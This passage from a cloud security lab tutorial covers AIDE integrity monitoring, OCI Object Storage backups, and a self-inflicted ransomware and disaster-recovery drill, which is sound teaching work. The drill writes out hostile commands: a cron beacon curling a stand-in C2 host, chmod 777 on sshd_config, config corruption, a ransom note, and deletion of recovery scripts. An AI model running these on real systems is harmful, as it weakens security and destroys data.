                f"Highest severity: {parsed_report['highest_severity']}. "
                f"Immediate investigation required per NIST 800-53 SI-7."
            )
        ),
    }

    # Output JSON
    json_output = json.dumps(parsed_report, indent=2)

    if args.output:
        with open(args.output, "w") as output_file:
            output_file.write(json_output)
        print(f"Report written to {args.output}", file=sys.stderr)
    else:
        print(json_output)


if __name__ == "__main__":
    main()
EOF

chmod +x ~/oci-federal-lab-phase2/scripts/aide_parser.py
```

**Test the parser against the results you saved:**

```bash
python3 ~/oci-federal-lab-phase2/scripts/aide_parser.py \
    --input /tmp/aide-check-results.txt \
    --output /tmp/aide-incident-report.json

# View the structured report
cat /tmp/aide-incident-report.json
```

Expected output (truncated for readability):

```json
{
  "report_generated_at": "2026-04-08T09:25:14Z",
  "clean": false,
  "summary": {
    "added": 2,
    "removed": 0,
    "changed": 1
  },
  "added": [
    { "path": "/bin/fake-malicious-binary", "severity": "HIGH" },
    { "path": "/etc/suspicious-attacker-file", "severity": "MEDIUM" }
  ],
  "removed": [],
  "changed": [
    {
      "path": "/etc/ssh/sshd_config",
      "changed_attributes": "Lp.. . .",
      "severity": "HIGH"
    }
  ],
  "severity_breakdown": { "HIGH": 2, "MEDIUM": 1, "LOW": 0 },
  "highest_severity": "HIGH",
  "incident_summary": {
    "total_findings": 3,
    "requires_immediate_action": true,
    "description": "INTEGRITY VIOLATION DETECTED. 3 unauthorized change(s) found. Highest severity: HIGH. Immediate investigation required per NIST 800-53 SI-7."
  }
}
```

**Clean up the simulated changes before continuing:**

```bash
# Remove the unauthorized files
sudo rm /etc/suspicious-attacker-file
sudo rm /bin/fake-malicious-binary

# Restore sshd_config permissions
sudo chmod 600 /etc/ssh/sshd_config

# Verify clean state
sudo aide --check 2>&1 | grep -E "All files match|differences"
```

> You will still see AIDE report changes for the removed files (they were in the baseline, now gone). This is expected. After cleanup, re-initialize the baseline: `sudo aide --update && sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz`. But for this lab, keep the current baseline — the DR drill in Phase 25 will reset everything.

---

### Step 24.5 — Automate AIDE with Cron

**Create the AIDE check script:**

```bash
sudo tee /usr/local/bin/fedanalytics-aide-daily-check.sh << 'EOF'
#!/bin/bash
# fedanalytics-aide-daily-check.sh
# Daily AIDE integrity check with structured logging.
# Runs via cron. On violation, writes alert to syslog and saves JSON report.

AIDE_RESULTS_FILE="/tmp/aide-daily-check-$(date +%Y%m%d-%H%M%S).txt"
AIDE_REPORT_FILE="/var/log/fedanalytics-aide-reports/aide-report-$(date +%Y%m%d).json"
AIDE_PARSER="/home/fedanalytics-user/oci-federal-lab-phase2/scripts/aide_parser.py"
LOG_TAG="FEDANALYTICS-AIDE"

# Ensure report directory exists
mkdir -p /var/log/fedanalytics-aide-reports

# Run AIDE check and capture output
/usr/sbin/aide --check > "$AIDE_RESULTS_FILE" 2>&1
AIDE_EXIT_CODE=$?

# AIDE exit codes:
# 0 = no changes detected
# 1 = new files found
# 2 = removed files found
# 4 = changed files found
# (these can combine: 7 = all three types of changes)

if [ "$AIDE_EXIT_CODE" -eq 0 ]; then
    logger -t "$LOG_TAG" "INTEGRITY CHECK PASSED — system matches baseline. Exit code: 0"
else
    # Parse output into JSON report
    python3 "$AIDE_PARSER" \
        --input "$AIDE_RESULTS_FILE" \
        --output "$AIDE_REPORT_FILE"

    # Log alert to syslog (picked up by journald on Oracle Linux 9)
    logger -t "$LOG_TAG" -p user.crit \
        "INTEGRITY VIOLATION DETECTED — exit code: $AIDE_EXIT_CODE — report: $AIDE_REPORT_FILE"

    # Print to stdout for cron email capture
    echo "=========================================="
    echo "FEDANALYTICS AIDE INTEGRITY ALERT"
    echo "Timestamp: $(date)"
    echo "Exit Code: $AIDE_EXIT_CODE"
    echo "Results: $AIDE_RESULTS_FILE"
    echo "JSON Report: $AIDE_REPORT_FILE"
    echo "=========================================="
    cat "$AIDE_RESULTS_FILE"
fi

# Clean up results files older than 30 days
find /var/log/fedanalytics-aide-reports/ -name "aide-report-*.json" -mtime +30 -delete
find /tmp/ -name "aide-daily-check-*.txt" -mtime +7 -delete

exit $AIDE_EXIT_CODE
EOF

sudo chmod +x /usr/local/bin/fedanalytics-aide-daily-check.sh
```

**Install the cron job:**

```bash
# Add to root's crontab — runs at 3:00 AM daily
sudo crontab -l 2>/dev/null | { cat; echo "0 3 * * * /usr/local/bin/fedanalytics-aide-daily-check.sh"; } | sudo crontab -

# Verify the cron entry was added
sudo crontab -l
```

Expected output:

```
0 3 * * * /usr/local/bin/fedanalytics-aide-daily-check.sh
```

**Test the script runs cleanly:**

```bash
sudo /usr/local/bin/fedanalytics-aide-daily-check.sh
echo "Exit code: $?"
```

On a clean system this produces no output and returns exit code `0`. Check syslog to confirm the pass was logged:

```bash
sudo journalctl -t FEDANALYTICS-AIDE --since "5 minutes ago"
```

Expected:

```
Apr 08 09:45:12 k3s-server FEDANALYTICS-AIDE[12345]: INTEGRITY CHECK PASSED — system matches baseline. Exit code: 0
```

> **💼 Interview Insight — FIM Automation in Federal Environments:** "Automated FIM is a requirement, not optional. NIST 800-53 SI-7(1) specifically requires automated integrity checks. I implemented this with cron and a custom parser because it demonstrates the full loop: detect changes, structure the output, log to syslog (which feeds a SIEM), and clean up old reports automatically. In a real federal program, that syslog output would flow into Splunk or an OCI Logging Analytics workspace and trigger a ServiceNow ticket. I designed mine to be SIEM-ready from the start — the JSON format means you can pipe it anywhere."

---

### Phase 24 Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| `aide --init` hangs for more than 15 minutes | Monitoring too many large directories | Check if `/proc` or `/sys` are accidentally included in `aide.conf` — add `!/proc` and `!/sys` exclusions |
| `aide --check` returns `error: No such file or directory` for database | Database not promoted from `.db.new.gz` | Run `sudo cp /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz` |
| Parser script returns empty `added`/`changed` lists | AIDE output format version difference | Run `aide --version` — slight format differences exist between AIDE 0.16 and 0.17; adjust regex patterns in `aide_parser.py` |
| Cron job not running | Cron daemon not running | `sudo systemctl enable --now crond` on Oracle Linux 9 |
| Thousands of false positives on first `--check` after app deployment | Baseline taken before app files existed | Re-run `sudo aide --init` after all app files are in place, then promote the new database |
| `logger` command not found | `util-linux` package missing | `sudo dnf install -y util-linux` |
| `aide --check` shows `/etc/mtab` changed every run | `/etc/mtab` not excluded | Add `!/etc/mtab` to `aide.conf` exclusions |

---

## PHASE 24A: OBJECT STORAGE BACKUP ARCHITECTURE (1 hr)

📍 **Where work happens:** OCI Console (bucket creation), then back on `k3s-server` for the backup script.

<sub><em>

| Sequence | Step | Duration |
|----------|------|----------|
| Mid-morning | 24A.1 — Create bucket with versioning | 15 min |
| Mid-morning | 24A.2 — Build backup script | 30 min |
| Mid-morning | 24A.3 — Verify backup and restore | 15 min |

</em></sub>

---

### Step 24A.1 — OCI Object Storage for Backups

> **🧠 ELI5 — Object Storage is a Safety Deposit Box:** A safety deposit box is durable (the bank protects it), versioned (you can retrieve what you put in even after adding more), and tamper-resistant if you lock it right. OCI Object Storage works the same way. You upload files (objects) to a bucket. With versioning on, every upload creates a new version — the old one is preserved. With retention rules, objects cannot be deleted before a set date even by an admin. An attacker who compromises your server cannot delete your OCI-managed backups because the storage plane is isolated from the compute plane.

#### Create the backup bucket in OCI Console

1. Open the OCI Console: `https://cloud.oracle.com`
2. Navigate to: **Storage → Object Storage & Archive Storage → Buckets**
3. Click **Create Bucket**
4. Fill in the form:

| Field | Value |
|-------|-------|
| Bucket Name | `fedanalytics-backups` |
| Default Storage Tier | Standard |
| Encryption | Encrypt using Oracle managed keys (default, free) |
| Object Versioning | **Enable** (check the box) |

5. Click **Create**

#### Enable a retention rule (WORM — Write Once Read Many)

After the bucket is created:

1. Click on the `fedanalytics-backups` bucket
2. Click **Retention Rules** in the left panel
3. Click **Create Retention Rule**

| Field | Value |
|-------|-------|
| Rule Name | `fedanalytics-30-day-lock` |
| Time Amount | 30 |
| Time Unit | Days |
| Rule Type | **Definite** (locks for exactly 30 days from upload) |

4. Click **Create Retention Rule**

> **Why retention rules matter for federal compliance:** FedRAMP and NIST 800-53 AU-11 require log and backup retention for defined periods. A retention rule enforces this at the storage layer — even an account admin cannot delete objects before the lock expires. This is called WORM (Write Once, Read Many) storage and is specifically cited in federal data protection standards.

#### Set up a lifecycle policy (auto-archive old backups)

Still in the bucket settings:

1. Click **Lifecycle Policy Rules** → **Create Rule**

| Field | Value |
|-------|-------|
| Rule Name | `archive-backups-after-90-days` |
| Target | Objects |
| Prefix (optional) | `backup-` |
| Action | Move to Archive tier |
| Number of Days | 90 |

Archive storage costs ~$0.0026/GB/month vs Standard's ~$0.0255/GB/month. Since you are on Always Free, you won't pay either way — but configuring this shows production awareness.

> **💼 Interview Insight — Storage Tiering and Backup Costs:** "One of the first things I did in the backup design was separate hot backups from cold archives. Recent backups (last 30 days) stay in Standard tier for fast restore. Older backups move to Archive tier automatically. In a federal contract, storage costs get scrutinized in the CPFF or FPIF line items — showing you think about lifecycle from day one is a differentiator."

---

### Step 24A.2 — Create the Backup Script

This script collects the most important recovery artifacts from your server and uploads them to OCI Object Storage with timestamp-based naming. If your compute instances are completely destroyed, this backup is what you restore from.

```bash
cat > ~/oci-federal-lab-phase2/scripts/backup_to_oci.py << 'EOF'
#!/usr/bin/env python3
"""
backup_to_oci.py — Backup critical fedanalytics artifacts to OCI Object Storage.

What gets backed up:
    - ADB wallet (connection credentials for Oracle Autonomous Database)
    - k3s Kubernetes manifests (app deployment definitions)
    - Ansible playbooks (infrastructure automation)
    - AIDE baseline database (integrity monitoring reference)
    - App configuration files (environment settings)
    - Backup script itself (self-referential — so you can restore the restore tool)

Usage:
    python3 backup_to_oci.py
    python3 backup_to_oci.py --dry-run   (list what would be backed up, no upload)

Requires:
    - OCI CLI configured: ~/.oci/config with valid API key
    - pip install oci (OCI Python SDK)
    - Bucket 'fedanalytics-backups' must exist in OCI Object Storage
"""

import os
import sys
import tarfile
import hashlib
import argparse
import json
from datetime import datetime, timezone
from pathlib import Path

try:
    import oci
except ImportError:
    print("ERROR: OCI SDK not installed. Run: pip install oci", file=sys.stderr)
    sys.exit(1)


# ── Configuration ──────────────────────────────────────────────────────────────
BACKUP_BUCKET_NAME = "fedanalytics-backups"
OCI_CONFIG_FILE = os.path.expanduser("~/.oci/config")
OCI_CONFIG_PROFILE = "DEFAULT"

# Directories and files to include in the backup archive
BACKUP_SOURCES = [
    {
        "label": "adb-wallet",
        "path": os.path.expanduser("~/adb-wallet"),
        "description": "Oracle ADB connection wallet — required to connect to Autonomous Database",
    },
    {
        "label": "k3s-manifests",
        "path": os.path.expanduser("~/oci-federal-lab-phase2/k8s"),
        "description": "Kubernetes deployment manifests for FedAnalytics on k3s",
    },
    {
        "label": "ansible-playbooks",
        "path": os.path.expanduser("~/oci-federal-lab-phase2/ansible"),
        "description": "Ansible playbooks for server hardening and app deployment",
    },
    {
        "label": "app-source",
        "path": os.path.expanduser("~/oci-federal-lab-phase2/app"),
        "description": "FedAnalytics FastAPI application source code",
    },
    {
        "label": "aide-baseline",
        "path": "/var/lib/aide/aide.db.gz",
        "description": "AIDE integrity monitoring baseline database",
    },
    {
        "label": "backup-scripts",
        "path": os.path.expanduser("~/oci-federal-lab-phase2/scripts"),
        "description": "Backup and automation scripts (including this script)",
    },
]

# ── Helpers ────────────────────────────────────────────────────────────────────

def compute_sha256_checksum(file_path):
    """Compute SHA-256 checksum of a file for upload verification."""
    sha256_hasher = hashlib.sha256()
    with open(file_path, "rb") as source_file:
        for data_chunk in iter(lambda: source_file.read(65536), b""):
            sha256_hasher.update(data_chunk)
    return sha256_hasher.hexdigest()


def create_backup_archive(archive_destination_path, sources_to_include, dry_run=False):
    """
    Create a gzipped tar archive containing all backup sources.
    Returns a list of included paths and any paths that were skipped.
    """
    included_paths = []
    skipped_paths = []

    if dry_run:
        for source_entry in sources_to_include:
            source_path = Path(source_entry["path"])
            if source_path.exists():
                included_paths.append(source_entry)
                print(f"  [DRY RUN] Would include: {source_entry['path']} ({source_entry['label']})")
            else:
                skipped_paths.append(source_entry)
                print(f"  [DRY RUN] Would SKIP (not found): {source_entry['path']}")
        return included_paths, skipped_paths

    with tarfile.open(archive_destination_path, "w:gz") as backup_archive:
        for source_entry in sources_to_include:
            source_path = Path(source_entry["path"])
            if source_path.exists():
                backup_archive.add(str(source_path), arcname=source_entry["label"])
                included_paths.append(source_entry)
                print(f"  Added: {source_entry['path']} -> {source_entry['label']}/")
            else:
                skipped_paths.append(source_entry)
                print(f"  WARNING: Skipped (not found): {source_entry['path']}")

    return included_paths, skipped_paths


def upload_to_object_storage(
    object_storage_client,
    namespace_name,
    bucket_name,
    object_name,
    local_file_path,
):
    """Upload a file to OCI Object Storage and return the upload response."""
    file_size_bytes = os.path.getsize(local_file_path)
    print(f"  Uploading {object_name} ({file_size_bytes / 1024:.1f} KB)...")

    with open(local_file_path, "rb") as upload_file_handle:
        upload_response = object_storage_client.put_object(
            namespace_name=namespace_name,
            bucket_name=bucket_name,
            object_name=object_name,
            put_object_body=upload_file_handle,
        )

    return upload_response


# ── Main ───────────────────────────────────────────────────────────────────────

def main():
    arg_parser = argparse.ArgumentParser(
        description="Backup FedAnalytics artifacts to OCI Object Storage."
    )
    arg_parser.add_argument(
        "--dry-run",
        action="store_true",
        help="List what would be backed up without uploading anything.",
    )
    args = arg_parser.parse_args()

    # Timestamp for this backup run (used in object names)
    backup_timestamp = datetime.now(timezone.utc).strftime("%Y%m%d-%H%M%S")
    backup_run_label = f"backup-{backup_timestamp}"

    print(f"\n{'='*60}")
    print(f"FedAnalytics Backup Run: {backup_run_label}")
    print(f"{'='*60}\n")

    # ── Step 1: Create local archive ──────────────────────────────────────────
    local_archive_path = f"/tmp/{backup_run_label}.tar.gz"
    print(f"Creating backup archive: {local_archive_path}")

    included_sources, skipped_sources = create_backup_archive(
        archive_destination_path=local_archive_path,
        sources_to_include=BACKUP_SOURCES,
        dry_run=args.dry_run,
    )

    if args.dry_run:
        print(f"\n[DRY RUN] Would upload to: oci:///{BACKUP_BUCKET_NAME}/{backup_run_label}/")
        print(f"[DRY RUN] Included: {len(included_sources)} sources, Skipped: {len(skipped_sources)} sources")
        return

    # ── Step 2: Compute checksum ──────────────────────────────────────────────
    archive_checksum = compute_sha256_checksum(local_archive_path)
    archive_size_kb = os.path.getsize(local_archive_path) / 1024
    print(f"\nArchive created: {archive_size_kb:.1f} KB")
    print(f"SHA-256: {archive_checksum}")

    # ── Step 3: Connect to OCI ────────────────────────────────────────────────
    print("\nConnecting to OCI Object Storage...")
    oci_config = oci.config.from_file(OCI_CONFIG_FILE, OCI_CONFIG_PROFILE)
    object_storage_client = oci.object_storage.ObjectStorageClient(oci_config)
    namespace_name = object_storage_client.get_namespace().data
    print(f"Connected. Namespace: {namespace_name}")

    # ── Step 4: Upload archive ────────────────────────────────────────────────
    archive_object_name = f"{backup_run_label}/{backup_run_label}.tar.gz"
    print(f"\nUploading archive to OCI...")
    upload_to_object_storage(
        object_storage_client=object_storage_client,
        namespace_name=namespace_name,
        bucket_name=BACKUP_BUCKET_NAME,
        object_name=archive_object_name,
        local_file_path=local_archive_path,
    )

    # ── Step 5: Upload manifest ───────────────────────────────────────────────
    backup_manifest = {
        "backup_run": backup_run_label,
        "timestamp": backup_timestamp,
        "archive_object": archive_object_name,
        "archive_sha256": archive_checksum,
        "archive_size_bytes": int(archive_size_kb * 1024),
        "included_sources": [s["label"] for s in included_sources],
        "skipped_sources": [s["label"] for s in skipped_sources],
        "bucket": BACKUP_BUCKET_NAME,
        "namespace": namespace_name,
    }

    manifest_path = f"/tmp/{backup_run_label}-manifest.json"
    with open(manifest_path, "w") as manifest_file:
        json.dump(backup_manifest, manifest_file, indent=2)

    manifest_object_name = f"{backup_run_label}/manifest.json"
    upload_to_object_storage(
        object_storage_client=object_storage_client,
        namespace_name=namespace_name,
        bucket_name=BACKUP_BUCKET_NAME,
        object_name=manifest_object_name,
        local_file_path=manifest_path,
    )

    # ── Step 6: Cleanup and summary ───────────────────────────────────────────
    os.remove(local_archive_path)
    os.remove(manifest_path)

    print(f"\n{'='*60}")
    print("BACKUP COMPLETE")
    print(f"{'='*60}")
    print(f"Run Label:    {backup_run_label}")
    print(f"Archive:      oci:///{BACKUP_BUCKET_NAME}/{archive_object_name}")
    print(f"Manifest:     oci:///{BACKUP_BUCKET_NAME}/{manifest_object_name}")
    print(f"SHA-256:      {archive_checksum}")
    print(f"Included:     {', '.join(s['label'] for s in included_sources)}")
    if skipped_sources:
        print(f"Skipped:      {', '.join(s['label'] for s in skipped_sources)}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
EOF

chmod +x ~/oci-federal-lab-phase2/scripts/backup_to_oci.py
```

**Install the OCI Python SDK on k3s-server:**

```bash
pip3 install oci --user
```

**Test with dry run first:**

```bash
python3 ~/oci-federal-lab-phase2/scripts/backup_to_oci.py --dry-run
```

Expected output:

```
============================================================
FedAnalytics Backup Run: backup-20260408-093000
============================================================

Creating backup archive: /tmp/backup-20260408-093000.tar.gz
  [DRY RUN] Would include: /home/fedanalytics-user/adb-wallet (adb-wallet)
  [DRY RUN] Would include: /home/fedanalytics-user/oci-federal-lab-phase2/k8s (k3s-manifests)
  [DRY RUN] Would include: /home/fedanalytics-user/oci-federal-lab-phase2/ansible (ansible-playbooks)
  [DRY RUN] Would include: /home/fedanalytics-user/oci-federal-lab-phase2/app (app-source)
  [DRY RUN] Would SKIP (not found): /var/lib/aide/aide.db.gz
  [DRY RUN] Would include: /home/fedanalytics-user/oci-federal-lab-phase2/scripts (backup-scripts)

[DRY RUN] Would upload to: oci:///fedanalytics-backups/backup-20260408-093000/
[DRY RUN] Included: 5 sources, Skipped: 1 sources
```

**Run the real backup:**

```bash
python3 ~/oci-federal-lab-phase2/scripts/backup_to_oci.py
```

---

### Step 24A.3 — Verify Backup and Restore

#### List backup objects in the bucket

```bash
oci os object list \
    --bucket-name fedanalytics-backups \
    --query "data[].{name:name, size:\"size\"}" \
    --output table
```

| Flag | What It Does |
|------|-------------|
| `--bucket-name fedanalytics-backups` | Target bucket |
| `--query "data[].{name:name, size:\"size\"}"` | JMESPath filter — show only name and size columns |
| `--output table` | Render as a formatted table instead of raw JSON |

Expected output:

```
+-----------------------------------------------+----------+
| name                                          | size     |
+-----------------------------------------------+----------+
| backup-20260408-093000/backup-20260408-093000.tar.gz | 487293 |
| backup-20260408-093000/manifest.json           | 612      |
+-----------------------------------------------+----------+
```

#### Download and verify the manifest

```bash
oci os object get \
    --bucket-name fedanalytics-backups \
    --name "backup-20260408-093000/manifest.json" \
    --file /tmp/restored-manifest.json

cat /tmp/restored-manifest.json
```

Verify the SHA-256 in the manifest matches what was reported during upload. This confirms the object was not corrupted in transit.

#### Test-restore the archive (spot check)

```bash
# Download the archive
oci os object get \
    --bucket-name fedanalytics-backups \
    --name "backup-20260408-093000/backup-20260408-093000.tar.gz" \
    --file /tmp/restored-backup.tar.gz

# Verify checksum matches the manifest
sha256sum /tmp/restored-backup.tar.gz

# List contents without extracting
tar -tzvf /tmp/restored-backup.tar.gz | head -30
```

You should see your directories listed:

```
drwxr-xr-x fedanalytics-user/fedanalytics-user     adb-wallet/
-rw-r--r-- fedanalytics-user/fedanalytics-user     adb-wallet/cwallet.sso
-rw-r--r-- fedanalytics-user/fedanalytics-user     adb-wallet/tnsnames.ora
drwxr-xr-x fedanalytics-user/fedanalytics-user     k3s-manifests/
-rw-r--r-- fedanalytics-user/fedanalytics-user     k3s-manifests/fedanalytics-deployment.yaml
...
```

> **💼 Interview Insight — The 3-2-1 Backup Rule:** "The 3-2-1 rule: three copies of data, on two different media types, with one copy offsite. In this lab: copy one is the running database in ADB (managed service — Oracle maintains it), copy two is the backup archive on OCI Object Storage (a different storage plane from compute), copy three is a version-locked copy inside Object Storage with versioning enabled (different 'time' copy). It's not a perfect 3-2-1 because everything is within OCI — but for a lab, it demonstrates the principle. In a real federal program, you'd add a cross-region backup to satisfy the 'geographic separation' requirement of NIST 800-34."

---

### Phase 24A Troubleshooting

| Issue | Likely Cause | Fix |
|-------|-------------|-----|
| `oci: command not found` | OCI CLI not installed | `pip3 install oci-cli --user` then re-source your shell |
| `Authorization failed or requested resource not found` | IAM policy missing | Verify your user or instance principal has `manage objects` on the bucket |
| `BucketNotFound` error in Python script | Bucket name typo or wrong region | Check bucket name in OCI Console; set correct region in `~/.oci/config` |
| `oci os object list` returns empty | Wrong compartment | Add `--compartment-id your-compartment-ocid` to the CLI command |
| Archive is 0 bytes | Backup sources not found | Run `--dry-run` first to confirm all paths exist |
| Retention rule blocks your own delete | WORM lock is working correctly | This is expected — wait for the retention period or use a test bucket without locks during development |
| Python script: `No module named 'oci'` | OCI SDK installed for wrong Python | Use `python3 -m pip install oci` instead of bare `pip3 install oci` |

---

## PHASE 25: RANSOMWARE SIMULATION + DR DRILL (2-3 hrs)

📍 **Where work happens:** `k3s-server` for the attack and recovery steps. OCI Console to verify managed services are unaffected. Your local machine to track timing.

> **This is the climax of Phase 2.** Everything you have built — Terraform infra, Ansible hardening, FedAnalytics on k3s, AIDE monitoring, Object Storage backups — is about to be tested as a system. The simulated attack will destroy your compute-layer resources. The ADB data will survive untouched because OCI managed services are isolated from the compute plane. You will recover, measure your time, and produce a DR report you can show in interviews.

<sub><em>

| Sequence | Step | Duration | What Happens |
|----------|------|----------|--------------|
| Afternoon | 25.1 — Pre-attack baseline | 15 min | Record clean state |
| Afternoon | 25.2 — Simulate the attack | 20 min | Destroy compute-layer resources |
| Afternoon | 25.3 — Incident detection | 15 min | AIDE catches the damage |
| Afternoon | 25.4 — Recovery procedure | 45-75 min | Rebuild from backups |
| Afternoon | 25.5 — Measure RTO/RPO | 15 min | Calculate actual recovery time |
| Afternoon | 25.6 — Post-mortem | 20 min | Document lessons learned |

</em></sub>

---

### Step 25.1 — Pre-Attack Baseline

Before simulating anything, you need a documented "before" snapshot. This is your ground truth for verifying full recovery.

#### Record the pre-attack application state

```bash
# From your local machine (WSL2) — store these results in a file
ATTACK_START_TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Hit the Load Balancer (not the node directly — test the real path)
LOAD_BALANCER_IP="your-load-balancer-public-ip"

# Health check — capture record_count
curl -s "http://${LOAD_BALANCER_IP}/health" | python3 -m json.tool
```

Expected output — write down the `record_count` value:

```json
{
  "status": "healthy",
  "service": "FedAnalytics",
  "record_count": 247,
  "database": "connected",
  "version": "1.0.0"
}
```

```bash
# Metrics — capture ingestion and webhook counts
curl -s "http://${LOAD_BALANCER_IP}/metrics" | python3 -m json.tool
```

```bash
# Save baseline to a file you will reference during recovery
cat > /tmp/pre-attack-baseline.json << EOF
{
  "attack_simulation_start": "${ATTACK_START_TIMESTAMP}",
  "load_balancer_ip": "${LOAD_BALANCER_IP}",
  "pre_attack_state": {
    "health_endpoint_status": "healthy",
    "record_count": 247,
    "health_check_url": "http://${LOAD_BALANCER_IP}/health",
    "note": "Replace 247 with your actual record_count from /health"
  },
  "rto_target_minutes": 30,
  "rpo_target": "zero_data_loss",
  "rpo_rationale": "ADB is a managed service — data persists independent of compute layer"
}
EOF

cat /tmp/pre-attack-baseline.json
```

#### Confirm AIDE shows a clean state

```bash
# SSH to k3s-server
ssh -J fedanalytics-bastion fedanalytics-k3s-server

# Run AIDE check — must be clean before attack
sudo aide --check 2>&1 | tail -5
```

Expected:

```
### All files match AIDE database. Looks okay!
```

#### Record the k3s cluster state

```bash
# On k3s-server
sudo k3s kubectl get pods -A -o wide
sudo k3s kubectl get deployments -A
sudo k3s kubectl get services -A
```

Save this output — you will verify the same state is restored after recovery.

#### Document your RTO/RPO targets

| Metric | Target | Rationale |
|--------|--------|-----------|
| **RTO** (Recovery Time Objective) | 30 minutes | Time from attack detected to full service restoration |
| **RPO** (Recovery Point Objective) | 0 (zero data loss) | ADB is a managed service — Oracle maintains the data plane independently of your compute instances |

> **🧠 ELI5 — RTO vs RPO:** RTO is "how long can we be down?" RPO is "how much data can we afford to lose?" If your RTO is 30 minutes, the system must be back online within 30 minutes of an incident. If your RPO is zero, no data can be lost — every transaction must survive even a catastrophic failure. In this lab, RPO is zero because Oracle's ADB continues running even if your k3s nodes burn down. Your data is safe by architecture, not by luck.

---

### Step 25.2 — Simulate the Attack

> **You are now playing the attacker.** These commands simulate what ransomware or a malicious insider does: destroy the running application, corrupt configuration files, delete local recovery tools. Read each command before running it — you need to understand what you're breaking so you can fix it.

#### SSH to k3s-server as your normal user

```bash
ssh -J fedanalytics-bastion fedanalytics-k3s-server
```

#### Phase 1 of the attack: Destroy the running application

```bash
# Delete the FedAnalytics Kubernetes deployment
sudo k3s kubectl delete deployment fedanalytics -n default

# Delete the Kubernetes service (LB stops routing to app)
sudo k3s kubectl delete service fedanalytics-service -n default

# Verify the pods are gone
sudo k3s kubectl get pods -A
```

The Load Balancer will now start failing health checks. Traffic is still hitting the LB, but there is nothing alive to route to — connections will be refused or timeout.

#### Phase 2 of the attack: Corrupt configuration files

```bash
# Corrupt the AIDE configuration (attacker wants to blind the FIM tool)
sudo bash -c 'echo "# AIDE CONFIG CORRUPTED BY ATTACKER $(date)" >> /etc/aide.conf'
sudo bash -c 'echo "CORRUPTED_DIRECTIVE this_is_not_valid" >> /etc/aide.conf'

# Widen permissions on sshd_config (classic privilege escalation setup)
sudo chmod 777 /etc/ssh/sshd_config

# Drop a fake cron job (attacker persistence mechanism)
sudo bash -c 'echo "* * * * * root curl http://attacker-c2-server.example.com/beacon" > /etc/cron.d/attacker-persistence'

# Leave a "ransom note" (for realism)
sudo bash -c 'cat > /etc/RANSOM_NOTE.txt << NOTEEOF
YOUR FILES HAVE BEEN ENCRYPTED.
Send 2 BTC to address: 1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf
You have 72 hours.
NOTEEOF'
```

#### Phase 3 of the attack: Delete local recovery tools

```bash
# Delete the backup script (attacker removes your recovery tools)
rm ~/oci-federal-lab-phase2/scripts/backup_to_oci.py

# Delete the AIDE parser (can't generate structured incident reports without it)
rm ~/oci-federal-lab-phase2/scripts/aide_parser.py

# Record the moment the attack completed
echo "ATTACK SIMULATION COMPLETE: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
```

> **Notice what the attacker CANNOT touch:**
> - Your OCI Autonomous Database — it runs in Oracle's managed infrastructure, completely separate from your compute instances
> - Your Object Storage backups — they exist in the OCI storage plane with WORM retention locks
> - Your OCI Load Balancer configuration — it's a managed service outside your compute layer
> - Your Terraform state files (stored in OCI) — the attacker is inside the VM, not the control plane
>
> This is the core lesson of Phase 2: **architect your critical data onto managed services that survive compute destruction.**

#### Verify from your local machine that the app is down

```bash
# From WSL2 — should now fail or return an error
curl -s "http://${LOAD_BALANCER_IP}/health"
```

Expected: connection refused, timeout, or 502/503 from the LB.

---

### Step 25.3 — Incident Detection

You are now the on-call engineer. Something is wrong — monitoring alerts are firing, health checks are failing. Let's methodically determine what happened.

#### Detection: Load Balancer health checks failing

In OCI Console:
1. Navigate to **Networking → Load Balancers**
2. Click `fedanalytics-lb`
3. Click **Backend Sets** → `fedanalytics-backend-set`
4. Observe: both k3s nodes now show **Critical** health status (app is not running)

This is your first signal. Something killed the application on both nodes.

#### Detection: AIDE integrity check

```bash
# On k3s-server
sudo aide --check 2>&1 | tee /tmp/attack-aide-check.txt
```

AIDE will flag every change the attacker made:

```
AIDE, version 0.16

### AIDE found differences between database and filesystem!!

Summary:
  Total number of entries:        45231
  Added entries:                  3
  Removed entries:                2
  Changed entries:                2

---------------------------------------------------
Added entries:
---------------------------------------------------
f++++++++++++++++: /etc/RANSOM_NOTE.txt
f++++++++++++++++: /etc/cron.d/attacker-persistence

---------------------------------------------------
Removed entries:
---------------------------------------------------
f----------------: /home/fedanalytics-user/oci-federal-lab-phase2/scripts/backup_to_oci.py
f----------------: /home/fedanalytics-user/oci-federal-lab-phase2/scripts/aide_parser.py

---------------------------------------------------
Changed entries:
---------------------------------------------------
f   ...    Lp.. . . : /etc/ssh/sshd_config
f   ...    msc. . . : /etc/aide.conf
```

> AIDE cannot parse its own corrupted config to run `--check`, but the check runs against the **database** (the baseline), not the current config file. AIDE compares the current filesystem state to the last known-good snapshot. The corrupted `aide.conf` is itself flagged as a changed file.

#### Generate the structured incident report

The `aide_parser.py` script was deleted by the attacker — but your Object Storage backup has it.

```bash
# Download from Object Storage (the attacker couldn't touch this)
oci os object get \
    --bucket-name fedanalytics-backups \
    --name "backup-20260408-093000/backup-20260408-093000.tar.gz" \
    --file /tmp/restored-backup.tar.gz

# Extract just the scripts directory
tar -xzvf /tmp/restored-backup.tar.gz backup-scripts/ -C /tmp/

# Run the parser against the AIDE results
python3 /tmp/backup-scripts/aide_parser.py \
    --input /tmp/attack-aide-check.txt \
    --output /tmp/incident-report.json

cat /tmp/incident-report.json
```

#### Document the incident

```bash
DETECTION_TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

cat > /tmp/incident-detection-log.json << EOF
{
  "incident_id": "IR-$(date +%Y%m%d)-001",
  "detection_timestamp": "${DETECTION_TIMESTAMP}",
  "detection_method": "AIDE file integrity check + OCI Load Balancer health check failure",
  "initial_indicators": [
    "OCI Load Balancer backend health: Critical (both nodes)",
    "AIDE: 3 files added, 2 files removed, 2 files changed",
    "AIDE highest severity: HIGH (sshd_config permissions, ransom note in /etc)"
  ],
  "confirmed_impact": [
    "FedAnalytics deployment deleted from k3s cluster",
    "FedAnalytics service deleted — no traffic routing",
    "Attacker persistence cron job installed",
    "sshd_config permissions widened to 777",
    "Recovery scripts deleted from local filesystem"
  ],
  "data_integrity": "UNAFFECTED — ADB autonomous database running normally",
